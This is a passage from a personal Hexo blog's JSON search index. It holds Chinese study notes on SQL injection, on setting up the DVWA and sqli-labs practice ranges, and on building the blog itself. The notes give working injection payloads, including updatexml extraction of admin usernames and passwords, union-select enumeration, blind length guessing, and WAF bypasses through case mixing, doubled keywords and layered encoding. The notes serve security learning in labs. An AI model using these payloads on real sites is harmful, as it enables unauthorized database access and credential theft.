updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select table_name),0x7e) FROM admin limit 0,1),0x7e),1 🔺爆字段 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x7e, (select column_name),0x7e) FROM admin limit 0,1),0x7e),1) 🔺爆字段内容 1?id=1 and updatexml(1,concat(0x7e,(SELECT distinct concat(0x23,username,0x3a,password,0x23) FROM admin limit 0,1),0x7e),1)","path":"2020/08/08/sql注入基本笔记_1/","date":"08-08","excerpt":"","tags":[]},{"title":"SQL注入点的判断","text":"🔺⚪▲ 🔺 SQL注入点的判断⚪ 通常情况对于SQL注入点的基本判断通常情况下，可能存在 Sql 注入漏洞的 Url 是类似这种形式 ：http://xxx.xxx.xxx/abcd.php?id=XX 对 Sql 注入的判断，主要有两个方面：1.该带参数的 Url 是否存在 Sql 注入？2.如果存在 Sql 注入，是属于哪种 Sql 注入？对于可能存在 Sql 注入攻击的 ASP/PHP/JSP 动态网页中，一个动态网页中可能只有一个参数，也可能有多个参数。可能是整型参数也可能是字符串型参数，如果带有参数的 动态网页且此网页访问了数据库，就有可能存在 Sql 注入。若没有进行过字符过滤，则发生SQL注入的可能性就很大。 ⚪ 判断是否存在注入漏洞▲ 单引号判断在参数后面加上单引号，如： 1http://xxx/abc.php?id=1' 此时如果页面返回有错误，则证明是有存在注入漏洞。因为无论字符型还是整型都会因为单引号个数不匹配而报错。也存在有未报错的情况，这种情况不代表不存在sql注入漏洞，有可能是页面对单引号做了过滤，这种情况下需要用其他方法语句注入。 ⚪ 判断注入漏洞类型通常的sql注入漏洞分为两种类型，即数字型和字符型 。所有的类型都是根据数据库本身表的类型所产生的，在创建表的时候其后总有个数据类型的限制，而不同的数据库又有不同的数据类型，但无论怎么分常用的查询数据类型总是以数字与字符来区分的，因此就会产生注入点为何种类型。 ▲ 数字型的判断当输入的参 x 为整型时，通常 abc.php 中 Sql 语句类型大致如下： select * from &lt;表名&gt; where id = x 这种类型可以使用经典的 and 1=1 和 and 1=2 来判断：※ Url 地址中输入 http://xxx/abc.php?id= x and 1=1 页面依旧运行正常，继续进行下一步；※ Url 地址中继续输入 http://xxx/abc.php?id= x and 1=2 页面运行错误，则说明此 Sql 注入为数字型注入。原因如下：当输入 and 1=1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=1无语法错误且逻辑判断正确，返回正常；当输入 and 1=2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = x and 1=2无语法错误，但是逻辑判断为假，则返回错误。假设如果这是字符型注入的话，我们输入以上语句之后应该出现如下情况： 12select * from &lt;表名&gt; where id = 'x and 1=1'select * from &lt;表名&gt; where id = 'x and 1=2' 查询语句将 and 语句全部转换为了字符串，并没有进行 and 的逻辑判断，不会出现以上结果，故假设不成立。 ▲ 字符型判断当输入的参 x 为字符型时，通常 abc.php 中 SQL 语句类型大致如下： 1select * from &lt;表名&gt; where id = 'x' 这种类型我们同样可以使用 and &#39;1&#39;=&#39;1 和 and &#39;1&#39;=&#39;2来判断：Url 地址中输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;1 页面运行正常，继续进行下一步。Url 地址中继续输入 http://xxx/abc.php?id= x&#39; and &#39;1&#39;=&#39;2 页面运行错误，则说明此 Sql 注入为字符型注入。原因如下当输入 and ‘1’=’1时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;1&#39;该语句语法正确，逻辑判断正确，返回正确。当输入 and ‘1’=’2时，后台执行 Sql 语句：select * from &lt;表名&gt; where id = &#39;x&#39; and &#39;1&#39;=&#39;2&#39;该语句语法正确，但逻辑判断错误，则返回正确。","path":"2020/08/01/SQL注入点的判断/","date":"08-01","excerpt":"","tags":[]},{"title":"SQL注入绕过","text":"🔺⚪▲ 🔺 关键字的绕过⚪ 过滤如对and进行过滤，可以尝试：▲ 对于and,or的绕过可以尝试一下&amp;&amp;,||,异或特殊符号注入▲ 使用注释符绕过，比如: /*!and*/ uni/**/on se/**/lect▲ 大小写绕过: ANd UniOn SeleCt▲ 双关键字绕过: ununionion seselectlect▲ 关键字替换（在关键字中间可插入将会被WAF过滤的字符） – 例如SELECT可插入变成a&lt;nd，一旦插入字符被过滤，&lt;它将作为and传递。空格代替：+ %20 %09 %0a %0b %0c %0d %a0 %00 /**/ /!/ ⚪ 大小写混合如果正则表达式只针对小写或大写的关键字进行匹配处理，根据数据库以不区分大小写的方式处理SQL关键字的特性，改变大小写。 1https://mp.csdn.net/index.php?id=-15 uNIoN sELecT 1,2,3,4 ⚪ 替换关键字这种情况下大小写转化无法进行绕过而且正则表达式会替换或删除select、union这些关键字，可以先摸清楚后台的过滤机制，针对正则过滤进行利用，如果select、union这些关键字只匹配一次就可以利用双写关键字进行绕过。 1https://mp.csdn.net/index.php?id=-15 UNIunionON SELselectECT 1,2,3,4 ⚪ 使用编码▲ URL编码如在Chrome中输入一个链接非保留字的字符浏览器会对其URL编码如空格变为%20、单引号%27、左括号%28、右括号%29。普通的URL编码可能无法实现绕过，不过存在某种情况比如URL编码只进行了一次解码过滤，那么这时候就可以用两次URL编码进行绕过。 1未编码前：?id=-1' UNION SELECT 1,2,3,4 --+# 1一次编码后：?id=-1%27%20UNION%20SELECT%201,2,3,4%20--+# 1二次编码后：?id=-1%2527%2520UNION%2520SELECT%25201,2,3,4%2520--+# ▲ 十六进制编码对后台针对单引号或者关键字进行处理，就可以使用16进制，把 ‘glbimreb21’ 变为 0x676c62696d7265623231,就可不需要单引号包裹着变量进行简单的绕过了，在用 16进制进行绕过时，16进制前面要加0x。 1转换前：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema='glbimreb21' --+ 1转换后：?id=-55' union%20select%201,group_concat(table_name),3 from information_schema.tables where table_schema=0x676c62696d7265623231--+ ▲ Unicode编码Unicode是一种行业标准，它可以用不同的字符编码表示，Unicode有标准编码和非标准编码。常用的几个符号的一些Unicode编码单引号：%u0027、%u02b9、%u02bc、%u02c8、%u2032、%uff07、%c0%27、%c0%a7、%e0%80%a7空格：%u0020、%uff00、%c0%20、%c0%a0、%e0%80%a0左括号：%u0028、%uff08、%c0%28、%c0%a8、%e0%80%a8右括号：%u0029、%uff09、%c0%29、%c0%a9、%e0%80%a9举例： **?id=10%D6’%20AND%201=2%23 SELECT ‘Ä’=‘A’; #1** 两个示例中，前者利用双字节绕过，对单引号转义操作变成’，就变成了%D6%5C’，%D6%5C构成了一个款字节即Unicode字节，单引号可以正常使用。第二个示例使用的是两种不同编码的字符的比较，它们比较的结果可能是True或者False，关键在Unicode编码种类繁多，基于黑名单的过滤器无法处理所有情况，从而实现绕过。","path":"2020/07/26/SQL注入绕过/","date":"07-26","excerpt":"","tags":[]},{"title":"SQL注入 - - -猜解实践","text":"🔺⚪▲ 🔺 SQL注入—猜解这里使用的是DVWA平台进行注入，具体DVWA安装及配置方法、配置中常见问题网址已给出，这里不再赘述。▲首先进入DVWA主页并登录，选择“SQL injection”：▲使用控制参数的方法，让网址返回我们需要的信息。首先输入“1”并查看回显：（URL中ID=1，说明php页面通过get方法传递参数）▲此时点击右下角”View Source”查看源代码：其中可见SQL查询代码：由此可见实际执行的sql语句是 1SELECT first_name, last_name FROM users WHERE user_id = '1'; ▲（此方法摘自大佬的博客）如果使用其他方法，在输入框输入 1’ order by 1#，实际sql语句便会更改为： 1SELECT first_name, last_name FROM users WHERE user_id = '1' order by 1#`; 语句的意思是查询users表中user_id为1的数据并按第一字段排行。 ▲输入 1’ order by 1# 和 1’ order by 2# 时都返回正常：▲输入 1’ order by 3# 时，返回错误：由此可得users表中只有两个字段，数据为两列。继续使用联合查询获取信息。▲输入 1’ union select database(),user()# 开始查询，得到返回：从中我们可以得到一些信息—网站使用数据库为dvwa，执行查询的用户名额为root@localhost。▲输入 1’ union select version(),@@version_compile_os# 进行查询，再次得到返回信息：则可以知道当前数据库版本为 : 5.6.31-0ubuntu0.15.10.1.，当前操作系统为 : debian-linux-gnu。","path":"2020/07/19/SQL注入 - - -猜解实践/","date":"07-19","excerpt":"","tags":[]},{"title":"sql注入基础回头","text":"🔺⚪▲ 🔺sql注入的概念 sql注入是指应用对于使用者所输入的非法恶意语句的审查未经过判断或过滤不严，导致使用者刻意将恶意sql查询或添加语句输入参数中，通过欺骗数据库进行非授权的恶意查询，进行解析攻击。 🔺web三层架构的解析三层架构就是遵循符合“高内聚，低耦合”思想，将各个功能模块划分为表示层（UI）、业务逻辑层（BLL）和数据访问层（DAL）三层架构，各层之间采用接口相互访问，并通过对象模型的实体类作为数据传递的载体，不同的对象模型的实体类一般对应于数据库的不同表，实体类的属性与数据库表的字段名一致。（摘自百度百科词条） 🔺sql注入原理每当我们访问动态网页时, Web 服务器会向数据访问层发起 Sql 查询请求，如果权限验证通过就会执行 Sql 语句。结合用户的输入数据动态构造 Sql 语句，如果用户输入的数据被构造成恶意 Sql 代码，Web 应用又未对动态构造的 Sql 语句使用的参数进行审查，则会造成恶意语句的渗透，便是sql注入的基本形式。 ⚪sql注入影响▲ 攻击者不经授权便可获取到用户数据，借此盗取用户隐私信息；▲ 若网站拥有写入权限，攻击者甚至可以写入木马，对网站造成极大损害；▲ 攻击者拥有对其网站数据库的修改权限，可以肆意更改数据库中的内容；▲ 攻击者可以通过其他步骤获取到服务器的最高权限，并通过后门等方法，对服务器进行控制修改与操作。 ⚪sql注入常用语句▲ 判断是否存在注入点 1; and 1=1 and 1=2 ▲ 猜表 12and 0&lt;&gt;(select count(*) from *) and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表 ▲ 猜帐号数目（如果遇到0&lt; 返回正确页面 1&lt;返回错误页面说明帐号数目就是1个 ） 12and 0&lt;(select count(*) from admin) and 1&lt;(select count(*) from admin) ▲ 猜解字段名称 （在len( ) 括号里面加上我们想到的字段名称. ） 123and 1=(select count(*) from admin where len(*)&gt;0)-- and 1=(select count(*) from admin where len(用户字段名称name)&gt;0) and 1=(select count(*) from admin where len(_blank&gt;密码字段名称password)&gt;0) ▲ 猜解各个字段的长度 （猜解长度就是把&gt;0变换 直到返回正确页面为止 ） 1234567and 1=(select count(*) from admin where len(*)&gt;0) and 1=(select count(*) from admin where len(name)&gt;6) 错误 and 1=(select count(*) from admin where len(name)&gt;5) 正确 长度是6 and 1=(select count(*) from admin where len(name)=6) 正确and 1=(select count(*) from admin where len(password)&gt;11) 正确 and 1=(select count(*) from admin where len(password)&gt;12) 错误 长度是12 and 1=(select count(*) from admin where len(password)=12) 正确","path":"2020/07/12/sql注入基础回头/","date":"07-12","excerpt":"","tags":[]},{"title":"SQL靶场的建立","text":"🔺SQL靶场搭建▲ 本次自学搭建sql靶场，使用前请自行配置好bitnami软件； ⚪下载安装靶场▲1. 进入页面下载靶场文件：SQLI靶场；▲2. 将靶场文件压缩包解压至bitnami软件目录下的WAMP中apache2的htdocs文件夹内。 ⚪靶场的基础设置与运行▲1. 【解压与设置】解压完毕后，进入 “sqli-labs-master”文件夹内的“sql-connerctions”文件夹，打开其中的“db-creds.inc” 文件进行编辑。在该文件我们可以看到一串代码： 12345678&lt;?php//give your mysql connection username n password$dbuser ='root';$dbpass ='root';$dbname =\"security\";$host = 'localhost';$dbname1 = \"challenges\";?&gt; 选定其中$dbuser =&#39;root&#39;;项，将 root 替换为你所要设置的用户名。选定其中$dbpass =&#39;root&#39;;项，将 root 替换为你所要设置的密码。设置完密码后，保存并关闭；▲2. 【初步运行】在bitnami文件源目录下，打开manager-windows.exe文件，选择Open phpMyAdmin选项，进入页面，输入上一步所设置的用户名和密码，确认后登陆成功即可以关闭页面。▲3. 【开始使用】此时，进入sqli-labs-master文件夹内，选择index.html即可成功进入靶场，开始攻克难关！","path":"2020/03/29/SQL靶场的建立/","date":"03-29","excerpt":"","tags":[]},{"title":"本人的首次搭建hexo+github博客","text":"🔺组件准备步骤⚪node的安装▲进入node官网选择下载长期支持版； ▲下载后自行选择路径并安装。 ⚪注册一个GitHub账号▲进入GitHub官网，按照注册提示进行注册；▲在邮箱验证后，进入网址创建页面；▲在“Repository name”处填入自己的博客网址，格式为用户名.github.io(在用户名处填入自己注册账号时所用的用户名)，GitHub帐号注册步骤基本完成； ⚪git for windows组件的安装▲进入git官网，并在官网首页选择download下载安装包；▲下载安装包后，自行选择安装路径后执行安装，除安装时有两点需要注意外，其他建议都保持默认设置；※注意！安装到该步骤后勾选下方选项：Don’t creat a Start Menu folder；※注意！安装到该步骤后选择第二项Use Windows’ default console window； ▲至此，git安装步骤完成。 🔺设置配置⚪githubSHH的配置▲在git的安装目录处运行git-bash.exe运行界面如下：▲输入各种组件命令后回车安装组件（Github的注册邮箱地址即注册账号时的验证邮箱）；▲连续两次回车跳过设置密匙并形成密匙阵列；▲将命令窗口最小化后进入GitHub官网后进入个人的setting页面更改其他设置；▲按图选择SSH and GPG keys选项，并点击New SSH key；▲Title处填入自己的用户名，Key处填入用记事本方式打开的C:\\Users\\DELL.ssh路径的id_rsa.pub文件内的所有内容；▲至此，SSH配置完成。 ⚪Hexo的配置▲进入Hexo官网，可以发现官网首页的安装命令；▲在想要安装Hexo组件的盘中新建一个名为“blog”的文件夹，并在该blog文件夹内呼出cmd程序，并将事先打开的Hexo官网首页的安装命令复制到cmd运行框内并运行安装；▲安装后再输入hexo init +博客名指令进行初始化；▲初始化完成后，在运行框内输入cd +博客名进入博客，并输入npm install指令，回车安装；▲安装完成后，输入hexo s -p 5555（此处选择555端口），运行结束后就可以在localhost:5555地址看到自己的博客了。 🔺其他组件⚪自行安装sublime并按照博客主题修改设置。🔺至此，博客搭建完成。","path":"2020/02/15/本人的首次搭建hexo+github博客/","date":"02-15","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post1$ hexo new \"My New Post\" More info: Writing Run server1$ hexo server More info: Server Generate static files1$ hexo generate More info: Generating Deploy to remote sites1$ hexo deploy More info: Deployment","path":"2020/02/07/hello-world/","date":"02-07","excerpt":"","tags":[]}]}